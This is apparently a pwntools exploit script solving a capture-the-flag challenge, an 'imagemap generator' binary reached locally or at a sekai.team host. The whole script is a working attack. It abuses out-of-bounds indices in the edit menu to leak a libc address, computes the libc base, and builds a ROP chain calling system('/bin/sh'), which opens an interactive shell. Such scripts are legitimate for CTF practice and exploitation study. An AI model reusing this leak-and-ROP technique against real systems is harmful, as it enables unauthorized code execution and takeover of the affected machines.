from operator import truediv
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./generator"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("imagemap-generator.challs.sekai.team", 1337)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


def add(x, y, w, h, url, title):
    io.sendlineafter("choice: ", "1")
    io.sendlineafter(": ", str(x))
    io.sendlineafter(": ", str(y))
    io.sendlineafter(": ", str(w))
    io.sendlineafter(": ", str(h))
    io.sendlineafter(": ", url)
    io.sendlineafter(": ", title)


def delete(idx):
    io.sendlineafter("choice: ", "2")
    io.sendlineafter("to remove (1-16): ", str(idx))


def edit(idx, x, y, w, h, url, title, addr=False):
    io.sendlineafter("choice: ", "3")
    io.sendlineafter("): ", str(idx))
    io.sendlineafter("): ", str(x))
    io.sendlineafter("): ", str(y))
    io.sendlineafter("): ", str(w))
    if addr:

        io.recvuntil("ht (current: ", drop=True)
        leak = int(io.recv(15))
        log.success("leak :-----> " + hex(leak))
        libc.address = leak - 0x21aaa0
        log.success("libc.address :-----> " + hex(libc.address))
    io.sendlineafter("): ", str(h))
    io.sendlineafter("): ", url)
    io.sendlineafter("): ", title)


payload = b"tinyfat"
io.sendlineafter("Enter the image URL: ", payload)

add(1, 1, 1, 1, "11", "11")
# io.sendlineafter("choice: ", "1")
# io.sendlineafter(": ", payload)
# io.sendlineafter(": ", payload)
# io.sendlineafter("choice: ", "4")
# io.recvuntil(" 0 ", drop=True)
# leak_stack = int(io.recv(15))
# log.success("leak :-----> " + hex(leak_stack))

edit(-3, 3, 3, 3, 3, "3", "3", addr=True)
if libc.address > 0:
    system_addr = libc.symbols.get("system")
    binsh_addr = next(libc.search("/bin/sh"))
    pop_rdi = next(libc.search(asm("pop rdi; ret")))
    rop = ROP(libc)
    ret = rop.find_gadget(["ret"])[0]
    environ = libc.symbols["__environ"]

    payload = b"a" * 0xc0 + p64(0x123456)
    payload += p64(pop_rdi) + p64(binsh_addr)
    payload += p64(ret) + p64(system_addr)

    ddebug("break *0x401C6C\n break *0x000401BFB \n break *0x401EA2\n break *0x401FF2\n continue")
    edit(18, 4, 4, 4, 4, "4", payload)
    io.sendlineafter("choice: ", "5")

    io.interactive()
